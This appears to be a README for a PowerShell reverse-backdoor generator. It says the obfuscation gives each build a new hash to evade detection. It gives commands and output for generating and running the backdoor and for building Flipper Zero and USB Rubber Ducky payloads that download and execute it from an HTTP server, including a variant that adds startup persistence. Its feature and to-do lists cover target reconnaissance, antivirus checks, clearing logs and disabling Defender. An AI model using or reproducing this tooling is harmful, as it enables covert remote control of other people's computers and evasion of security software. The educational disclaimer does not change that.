```
/******************************************************************************
 * DISCLAIMER: 
 * 
 * This program is intended for educational purposes only. By using this program,
 * you agree that you understand the potential risks associated with its use.
 * 
 * - This program should not be used on any system or network without proper 
 *   authorization. Unauthorized use is strictly prohibited.
 * 
 * - The creator of this program assumes no liability for any damages, legal 
 *   consequences, or loss of data caused by the use of this program.
 * 
 * - It is your responsibility to ensure that you comply with all applicable 
 *   laws and regulations while using this program.
 * 
 * Please use this program responsibly and ethically, and respect the privacy 
 * and security of others.
 *****************************************************************************/


```

# powershell-backdoor
[![Guide](https://img.youtube.com/vi/C6_6-7b6P3E/0.jpg)](https://www.youtube.com/watch?v=C6_6-7b6P3E)
<br>
Reverse backdoor tool written in PowerShell and obfuscated with Python, providing a new signature after every build to avoid detection. The tool has the capability to create payloads for popular hacking devices such as Flipper Zero and Hak5 USB Rubber Ducky. Use this tool to test your system's defenses against advanced attack techniques.
```
usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY] [--flipper FLIPPER] [--ducky]
                 [--server-port SERVER_PORT] [--payload PAYLOAD] [--list--payloads] [-k KEYBOARD] [-L] [-H]

Powershell Backdoor Generator

options:
  -h, --help            show this help message and exit
  --ip-address IP_ADDRESS, -i IP_ADDRESS
                        IP Address to bind the backdoor too (default: 192.168.X.XX)
  --port PORT, -p PORT  Port for the backdoor to connect over (default: 4444)
  --random, -r          Randomizes the outputed backdoor's file name
  --out OUT, -o OUT     Specify the backdoor filename (relative file names)
  --verbose, -v         Show verbose output
  --delay DELAY         Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)
  --flipper FLIPPER     Payload file for flipper zero (includes EOL conversion) (relative file name)
  --ducky               Creates an inject.bin for the http server
  --server-port SERVER_PORT
                        Port to run the HTTP server on (--server) (default: 8080)
  --payload PAYLOAD     USB Rubber Ducky/Flipper Zero backdoor payload to execute
  --list--payloads      List all available payloads
  -k KEYBOARD, --keyboard KEYBOARD
                        Keyboard layout for Bad Usb/Flipper Zero (default: us)
  -A, --actually-listen
                        Just listen for any backdoor connections
  -H, --listen-and-host
                        Just listen for any backdoor connections and host the backdoor directory
```
# Quick Links
* [Preview](#preview)
* [Features](#features)
* [Standard Backdoor](#standard-backdoor)
* [Flipper Zero Backdoor](#flipper-zero-backdoor)
* [USB Rubber Ducky Backdoor](#usb-rubber-ducky-backdoor)
* [Thanks](#thanks)
* [To Do](#to-do)
* [Output of 5 Obfuscations](#output-of-5-obfuscations)

## Preview
![preview](/core/images/preview.PNG)
<br>

## Features
* Hak5 Rubber Ducky payload
* Flipper Zero payload
* Download Files from remote system
* Play wav files from a URL
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Gather information about the target system's operating system
* Retrieve BIOS information from the target syste
* Check if an anti-virus software is installed and its current status
* Get Active TCP Clients
* Install Chocolatey, a popular package manager for Windows (https://chocolatey.org/)
* Check if common pentesting software is installed on the target system.

## Standard backdoor
``` bash
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file in the current working directory will be created called backdoor.ps1

### Backdoor Execution
Tested on Windows 11, Windows 10 and Kali Linux. To run this as a hidden window and with persistence access follow the guide ![here](https://github.com/Drew-Alleman/powershell-backdoor-generator/issues/2#issuecomment-1546996105)
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```

# Bad USB/ USB Rubber Ducky attacks
When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.

## Payloads
   * Execute -- Execute the backdoor 
   * BindAndExecute -- Place the backdoor in the users temp directory, bind the backdoor to startup and then execute it. (Requires Admin)
## Flipper Zero Backdoor
Below will generate a file called powershell_backdoor.txt, which when triggered on the Flipper will fetch the backdoor from your computer over HTTP and execute it.
```
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor --payload execute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
Place the text file you specified (e.g: powershell_backdoor.txt) into your flipper zero. When the payload is executed 
it will download and execute backdoor.ps1

## Usb Rubber Ducky Backdoor
Below is a tutorial on how to generate an inject.bin file for the Hak5 USB Rubber ducky
```
 C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed 
it will download and execute backdoor.ps1

## Thanks
To encode payload.txt into inject.bin for USB Rubber Ducky Attacks I use encoder.jar created by ![midnitesnake](https://github.com/midnitesnake).

## To Do 
* Pull Recent RDP connections
* Change Wallpaper from URL
* Find Writeable Directories
* Clear Logs
* Disable Defender

## Output of 5 Obfuscations
Below is the sha1 hash of backdoor.ps1 after 5 builds.
```
1e158f02484e5c58d74c1507a1773392ffacfca2
6d18230a419195d0f77519abc0238768956cdd58
558a8cbac40239c9e6660a45cc8fc5d02b5057d7
caf4d0c8424eceb960d5f5c526e83ecd485c4ac9
947b57824917842d79f9cbcac8a795aa7c2f8a49
```
